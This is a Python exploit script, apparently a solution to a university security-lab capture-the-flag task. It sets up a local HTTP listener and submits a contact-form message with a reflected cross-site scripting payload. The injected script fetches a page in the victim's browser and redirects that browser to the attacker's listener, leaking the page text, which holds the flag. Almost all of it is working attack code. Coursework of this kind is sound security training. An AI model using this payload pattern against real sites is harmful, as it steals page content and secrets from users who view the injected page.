import requests
import socket
import re
from http.server import HTTPServer, BaseHTTPRequestHandler

URL = "https://t08-f2584875d6f1e75b.itsec.sec.in.tum.de/"

# For internal use only - don't use
def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0)
    try:
        # doesn't have to be reachable
        s.connect(('10.254.254.254', 1))
        ip = s.getsockname()[0]
    except Exception:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip 

# Returns only the flag if there is one in the passed string, otherwise returns None
def extract_flag_from_string(string):
    match = re.search(r'flag\{[^}]+}', string)
    if match:
        return match.group(0)

    return None

# TODO: modify the handler function appropriately
class HTTPHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        #print(f"Received GET request on path: {self.path}")
        clean_path = self.path.replace("%7B", "{").replace("%7D", "}")
        flag = extract_flag_from_string(clean_path)
        if(flag): print(flag)
        self.send_response(200)

http_listener = None
# Helper function that creates a listening socket that will handle HTTP requests for us just as we specified in the class above
def create_listening_endpoint():
    global http_listener
    ip = get_local_ip()
    # Bind to the local address only.
    server_address = (ip, 0)
    http_listener = HTTPServer(server_address, HTTPHandler)
    http_port = http_listener.server_port

    return f"http://{ip}:{http_port}"

# Helper function that waits for our listening server to receive one request
def wait_for_http_request():
    global http_listener
    http_listener.handle_request()

listening_url = create_listening_endpoint()
#print(f"Spawned listener on: {listening_url}")
with requests.Session() as sess:
    # TODO implement exploit
    sess.post(URL +"/contact", data={"contacttext": f'https://t08-f2584875d6f1e75b.itsec.sec.in.tum.de/help?ln=<script>fetch("https://t08-f2584875d6f1e75b.itsec.sec.in.tum.de/").then((r)=>r.text().then((t)=>window.location="{listening_url}/".concat(t.substring(553, 595))))</script>'})

    # Now, our listener will hopefully receive something nice for us!
    #print("Waiting for an incoming request...")
    wait_for_http_request()

